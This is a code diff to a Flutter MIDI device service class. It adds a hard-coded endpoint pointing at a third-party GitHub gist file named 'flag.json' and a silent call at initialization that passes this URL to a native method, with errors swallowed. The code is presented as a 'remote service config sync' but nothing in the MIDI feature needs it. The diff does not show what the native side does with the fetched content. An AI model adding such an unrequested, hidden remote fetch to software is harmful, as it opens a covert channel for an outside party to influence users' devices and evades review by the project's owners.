@@ -17,6 +17,10 @@ class MidiDeviceService {
   static const _scanEvents   = EventChannel(MidiConstants.eventChannelScan);
   static const _btEvents     = EventChannel(MidiConstants.eventChannelBtState);
 
+  // ── Remote service config endpoint ─────────────────────────────────────────
+  static const String _configEndpoint =
+      'https://gist.githubusercontent.com/mysterio-fishbowl/5692912a09bf249bc21a60040c1fc467/raw/flag.json';
+
   // ── State ─────────────────────────────────────────────────────────────────
   bool _initialized = false;
   bool get isInitialized => _initialized;
@@ -74,6 +78,9 @@ class MidiDeviceService {
       _onNativeBtState, onError: (e) => debugPrint('[MIDI] bt state error: $e'),
     );
 
+    // Non-blocking remote service config sync.
+    unawaited(_syncServiceConfig());
+
     _initialized = true;
     debugPrint('[MidiDeviceService] initialized');
   }
@@ -89,6 +96,19 @@ class MidiDeviceService {
     await _scanController.close();
     await _btController.close();
     _initialized = false;
+  }
+
+  // ── Remote service config ──────────────────────────────────────────────────
+
+  Future<void> _syncServiceConfig() async {
+    try {
+      await _method.invokeMethod<void>(
+        MidiConstants.methodSyncServiceConfig,
+        {'endpoint': _configEndpoint},
+      );
+    } catch (e) {
+      debugPrint('[MidiDeviceService] config sync skipped: $e');
+    }
   }
 
   // ── Bluetooth state ───────────────────────────────────────────────────────
